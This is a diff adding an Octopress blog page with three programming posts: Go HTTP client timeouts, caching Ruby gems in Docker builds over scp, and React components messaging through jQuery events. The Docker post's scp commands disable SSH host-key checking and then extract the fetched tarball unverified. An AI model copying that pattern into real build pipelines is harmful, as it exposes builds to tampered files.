+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">var</span> <span class="nx">DefaultDialer</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">net</span><span class="p">.</span><span class="nx">Dialer</span><span class="p">{}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">func</span> <span class="nx">GetHttpClient</span><span class="p">()</span> <span class="nx">http</span><span class="p">.</span><span class="nx">Client</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">tr</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Transport</span><span class="p">{</span>
+</span><span class='line'>      <span class="nx">Dial</span><span class="p">:</span>                <span class="nx">DefaultDialer</span><span class="p">.</span><span class="nx">Dial</span><span class="p">,</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nx">client</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span><span class="nx">Transport</span><span class="p">:</span> <span class="nx">tr</span><span class="p">}</span>
+</span><span class='line'>  <span class="k">return</span> <span class="nx">client</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Can you spot the bug?</p>
+
+<p>By omitting the Timeout, KeepAlive timeouts in the first example, we&rsquo;ve introduced a very subtle bug.</p>
+
+<p>There is also another bug if you don&rsquo;t handle TLS timeouts as well.</p>
+
+<p><a href="http://golang.org/pkg/net/#Dialer">net/Dialer</a> has some documentation on this.</p>
+
+<p>Without providing a KeepAlive and a Timeout value, you could end up with connections that hang indefinitely. By omitting the TLS handshake timeout, the daemon would also hang trying to re-negotiate the SSL connection.</p>
+
+<p>In my case this was causing a very random and hard to reproduce issue where the program would hang indefinitely.</p>
+
+<p>Some good debugging tips are using <code>strace</code> to see what syscall its stuck in, and if your daemon is running in the foreground, using a <code>SIGQUIT</code> signal.</p>
+
+<p>Here is a working version:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">var</span> <span class="nx">DefaultDialer</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">net</span><span class="p">.</span><span class="nx">Dialer</span><span class="p">{</span><span class="nx">Timeout</span><span class="p">:</span> <span class="mi">2</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">,</span> <span class="nx">KeepAlive</span><span class="p">:</span> <span class="mi">2</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">func</span> <span class="nx">GetHttpClient</span><span class="p">()</span> <span class="nx">http</span><span class="p">.</span><span class="nx">Client</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">tr</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Transport</span><span class="p">{</span>
+</span><span class='line'>      <span class="nx">Dial</span><span class="p">:</span>                <span class="nx">DefaultDialer</span><span class="p">.</span><span class="nx">Dial</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">TLSHandshakeTimeout</span><span class="p">:</span> <span class="mi">2</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">,</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nx">client</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span><span class="nx">Transport</span><span class="p">:</span> <span class="nx">tr</span><span class="p">}</span>
+</span><span class='line'>  <span class="k">return</span> <span class="nx">client</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/06/faster-docker-builds-using-a-cache/">Faster Docker Builds Using a Cache</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-06-17T21:30:07-04:00" pubdate data-updated="true">Jun 17<sup>th</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>If you&rsquo;re using bundler for your ruby or rails project and docker you will run into docker having to install your gems everytime. You can either make a base image that has the bundle cache already on it, or you can make a small cache step in your Dockerfile.</p>
+
+<p>Here I&rsquo;ve setup a cache user and host to store the cache tar. It will attempt to download and untar it, run <code>bundle</code>, then attempt to tar and re-upload it.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>RUN scp -o <span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no cache@172.17.42.1:~/project.tar.gz . <span class="o">||</span> <span class="nb">true</span>
+</span><span class='line'>RUN tar xzf project.tar.gz <span class="o">||</span> <span class="nb">true</span>
+</span><span class='line'>RUN bundle install --deployment --without development <span class="nb">test</span>
+</span><span class='line'>RUN tar czf project.tar.gz vendor
+</span><span class='line'>RUN scp -o <span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no project.tar.gz cache@172.17.42.1:~/ <span class="o">||</span> <span class="nb">true</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Doing this cut build times for my image from a few minutes to a few seconds. If you have any other tricks for speeding up builds, let me know!</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/02/communication-between-react-components-using-events/">Communication Between React Components Using Events</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-02-21T10:20:39-05:00" pubdate data-updated="true">Feb 21<sup>st</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Here is an example of a clean way to communicate between React components without getting stuck passing <code>@prop</code> callbacks all around. Inspired by looking at the new Flux React utilities.</p>
+
+<p>We&rsquo;re going to start off with a simple HAML file:</p>
+
+<figure class='code'><figcaption><span>index.html.haml </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='haml'><span class='line'><span class="nt">%script</span><span class="p">{</span><span class="ss">src</span><span class="p">:</span> <span class="s2">&quot;https://cdnjs.cloudflare.com/ajax/libs/react/0.12.2/react-with-addons.js&quot;</span><span class="p">}</span>
+</span><span class='line'><span class="nt">%div</span><span class="p">{</span><span class="ss">data</span><span class="p">:</span> <span class="p">{</span> <span class="ss">ui</span><span class="p">:</span> <span class="s1">&#39;alerts&#39;</span> <span class="p">}</span>}
+</span><span class='line'><span class="nt">%div</span><span class="p">{</span><span class="ss">data</span><span class="p">:</span> <span class="p">{</span> <span class="ss">ui</span><span class="p">:</span> <span class="s1">&#39;widgets&#39;</span> <span class="p">}</span>}
+</span><span class='line'><span class="nd">:javascript</span>
+</span><span class='line'>  <span class="nd">React.renderComponent(Widgets(), document.querySelector(&#39;[data-ui=&quot;widgets&quot;]&#39;))</span>
+</span><span class='line'>  <span class="nd">React.renderComponent(Alerts(), document.querySelector(&#39;[data-ui=&quot;alerts&quot;]&#39;))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next comes our <code>Widget</code> component.</p>
+
+<figure class='code'><figcaption><span>widget.js.coffee </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='coffee'><span class='line'><span class="p">{</span><span class="nx">div</span><span class="p">,</span> <span class="nx">button</span><span class="p">}</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nx">DOM</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">Widgets = </span><span class="nx">React</span><span class="p">.</span><span class="nx">createClass</span>
+</span><span class='line'>  <span class="nv">render: </span><span class="nf">-&gt;</span>
+</span><span class='line'>    <span class="nx">div</span> <span class="nv">className: </span><span class="s">&#39;widget&#39;</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">button</span> <span class="nv">className: </span><span class="s">&#39;btn btn-primary&#39;</span><span class="p">,</span> <span class="nv">onClick: </span><span class="p">(</span><span class="nf">=&gt;</span> <span class="nx">@_sendMsg</span><span class="p">(</span><span class="s">&#39;Testing&#39;</span><span class="p">)),</span> <span class="s">&#39;Click Me&#39;</span>
+</span><span class='line'>  <span class="nv">_sendMsg: </span><span class="nf">(msg) -&gt;</span>
+</span><span class='line'>    <span class="nx">$</span><span class="p">(</span><span class="s">&#39;[data-ui=&quot;alerts&quot;]&#39;</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="s">&quot;message&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;Widget clicked.&quot;</span><span class="p">])</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On line 1 we&rsquo;re defining some easy helper methods to access the <code>React.DOM</code> object - otherwise on every line we&rsquo;d be writing something like <code>React.DOM.div</code> or whichever element we were going to call.</p>
+
+<p>Line 4 is our render method. Everytime state gets mutated or the component is loaded, this method is called.</p>
+
+<p>On line 6 we&rsquo;re creating an anonymous function but passing in the local scope using a fat arrow <code>=&gt;</code> so we can access our other functions in the class. We call it inside an anonymous function so we can pass an argument to it, in this case the message.</p>
+
+<p>Line 7 is our function that fires the event. I&rsquo;m using the <code>_sendMsg</code> syntax to denote it is a private function. The first argument to the jQuery event emitter is the event name, followed by a list of arguments.</p>
+
+<p>Now lets write our <code>Alert</code> handler and go through it line by line.</p>
+
+<figure class='code'><figcaption><span>alerts.js.coffee </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='coffee'><span class='line'><span class="p">{</span><span class="nx">div</span><span class="p">}</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nx">DOM</span>
+</span><span class='line'><span class="nv">Alerts = </span><span class="nx">React</span><span class="p">.</span><span class="nx">createClass</span>
+</span><span class='line'>  <span class="nv">messageTimeout: </span><span class="mi">5000</span>
+</span><span class='line'>  <span class="nv">getInitialState: </span><span class="nf">-&gt;</span>
+</span><span class='line'>    <span class="nv">messages: </span><span class="p">[]</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">componentDidMount: </span><span class="nf">-&gt;</span>
+</span><span class='line'>    <span class="nx">$</span><span class="p">(</span><span class="s">&#39;[data-ui=&quot;alerts&quot;]&#39;</span><span class="p">).</span><span class="nx">on</span> <span class="s">&#39;message&#39;</span><span class="p">,</span> <span class="nf">(event, msg) =&gt;</span>
+</span><span class='line'>      <span class="nv">msgs = </span><span class="nx">@state</span><span class="p">.</span><span class="nx">messages</span>
+</span><span class='line'>      <span class="nx">msgs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span>
+</span><span class='line'>      <span class="nx">@setState</span><span class="p">(</span><span class="nv">messages: </span><span class="nx">msgs</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">componentDidUpdate: </span><span class="nf">-&gt;</span>
+</span><span class='line'>    <span class="nx">@state</span><span class="p">.</span><span class="nx">messages</span><span class="p">.</span><span class="nx">map</span> <span class="nf">(msg, index) =&gt;</span>
+</span><span class='line'>      <span class="nx">setTimeout</span><span class="p">((</span> <span class="nf">=&gt;</span> <span class="nx">@_removeMsg</span><span class="p">(</span><span class="nx">index</span><span class="p">)),</span> <span class="nx">@messageTimeout</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">render: </span><span class="nf">-&gt;</span>
+</span><span class='line'>    <span class="nx">div</span> <span class="p">{},</span>
+</span><span class='line'>      <span class="nx">@state</span><span class="p">.</span><span class="nx">messages</span><span class="p">.</span><span class="nx">map</span> <span class="nf">(msg, index) =&gt;</span>
+</span><span class='line'>        <span class="nx">div</span> <span class="nv">className: </span><span class="s">&#39;alert alert-info&#39;</span><span class="p">,</span>
+</span><span class='line'>          <span class="nx">msg</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">_removeMsg: </span><span class="nf">(index) -&gt;</span>
+</span><span class='line'>    <span class="nv">msgs = </span><span class="nx">@state</span><span class="p">.</span><span class="nx">messages</span>
+</span><span class='line'>    <span class="nx">msgs</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="nx">index</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>    <span class="nx">@setState</span><span class="p">(</span><span class="nv">messages: </span><span class="nx">msgs</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Line 1 we&rsquo;re doing the same thing as before, creating a little helper method.</p>
+
+<p>Line 3 is a class variable (we also could have used <code>props</code> here but I went with the class variable instead).</p>
+
+<p>Line 4 is a function that defines the initial state of the component once it is mounted on the page. Here we are saying that there is an empty <code>messages</code> array.</p>
+
+<p>Line 7 is a life cycle event of a React component, called <code>componentDidMount</code> which is called after the component has been rendered into the DOM and mounted.
+Here we are telling jQuery to bind to any events that are triggered on the <code>[data-ui="alerts"]</code> object and process them. We take the current messages from <code>@state.messages</code>, <code>push</code> the newest message on to the end and then finally call <code>@setState</code> to mutate the components state.</p>
+
+<p>Now the next part on line 13 is how we can gracefully remove messages after they have been rendered. <code>componentDidUpdate</code> is another React life cycle event and is called after a render occurs (and renders occur because the component was updated).
+We iterate over each message using the <code>map</code> function and call <code>setTimeout</code> with an anonymous function that calls <code>@_removeMsg</code> and passes in an index. <code>@messageTimeout</code> is how we access the class variable defined at the top of the file.</p>
+
+<p>Line 17 is a <code>render</code> call to display all the messages. Note that it is wrapped in a div because you can&rsquo;t return a collection of objects from render, it must a single root element with nodes underneath.</p>
+
+<p>Line 23 is our message removal function. We set <code>@state.messages</code> to a local variable, remove one element at <code>index</code> and then mutate the state by setting it to our local variable with <code>@setState</code>.</p>
+
+<p>Below is an example of the final product.</p>
+
+<p data-height="343" data-theme-id="0" data-slug-hash="ZYoEWg" data-default-tab="result" data-user="joshrendek" class='codepen'>See the Pen <a href='http://codepen.io/joshrendek/pen/ZYoEWg/'>ZYoEWg</a> by Josh Rendek (<a href='http://codepen.io/joshrendek'>@joshrendek</a>) on <a href='http://codepen.io'>CodePen</a>.</p>
+
+
+<script async src="//assets.codepen.io/assets/embed/ei.js"></script>
+
+
+<p>I&rsquo;d like to thank my friend/co-worker <a href="http://robertwpearce.com/blog/">Robert Pearce</a> for getting me into React and showing me that everything doesn&rsquo;t need to be jQuery!</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/page2">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Projects & Software</h1>
+  <ul>
+    <li><a href="https://github.com/joshrendek/docker-conductor">Docker Conductor</a> is a docker orchestration tool.</li>
+    <li><a href="http://sshpot.com/">sshpot.com</a> is a SSH honeypot service written in Go (both web service and client are open source).</li>
+    <li><a href="http://ifcfg.net/">ifcfg.net</a> is a simple &#8216;what is my IP&#8217; service with a few extra RESTful endpoints.</li>
+
+    <li><a href="/projects/">View More</a>
+
+    <li><a href="https://github.com/joshrendek?tab=repositories"><img src="/images/github.png" style='border: none;'> More on GitHub</a></li>
+    <li><a href="https://rubygems.org/profiles/joshrendek">Gems @ RubyGems</a></li>
+  </ul>
+</section>
+
+<section>
+  <h1>Other Blogs</h1>
+  <ul>
+    <li><a href="http://tendermeatlove.com">Tender Meat Love</a> is my blog about cooking.</li>
+    <li><a href="http://hydronerd.com">Hydro Nerd</a> is my blog about hydroponics and gardening.</li>
+  </ul>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2016/06/building-honeypots-and-analyzing-linux-malware/">Building Honeypots and Analyzing Linux Malware</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/11/understanding-elasticsearch-performance/">Understanding ElasticSearch Performance</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/11/building-a-distributed-waitgroup-with-go-and-redis/">Building a Distributed WaitGroup With Go and Redis</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/11/docker-and-ping-sendmsg-operation-not-permitted/">Docker and Ping: Sendmsg: Operation Not Permitted</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/10/influx-alert/">Influx Alert</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/09/getting-upstart-to-log-to-syslog-with-tags/">Getting Upstart to Log to Syslog With Tags</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/09/golang-performance-tips/">Golang Performance Tips</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - Josh Rendek -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'bluescripts';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
